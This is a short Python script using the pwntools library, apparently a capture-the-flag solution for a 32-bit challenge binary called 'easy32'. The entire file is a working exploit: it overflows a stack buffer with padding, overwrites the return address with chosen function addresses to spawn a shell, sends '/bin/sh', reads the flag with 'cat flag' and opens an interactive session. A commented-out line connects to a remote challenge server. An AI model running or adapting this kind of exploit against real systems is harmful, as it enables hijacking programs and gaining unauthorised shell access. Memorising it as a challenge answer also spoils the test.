from pwn import *

# conn = remote("81.68.214.63", 15000)
conn = process("./easy32")
conn.readline()
payload = b'n' * 0x48 + b"save" + p32(0x080485F4)+ p32(0x72) + p32(0x080485A6) 
conn.sendline(payload)
conn.sendline(b"/bin/sh")
print(conn.read())
conn.sendline(b"cat flag")
conn.interactive()
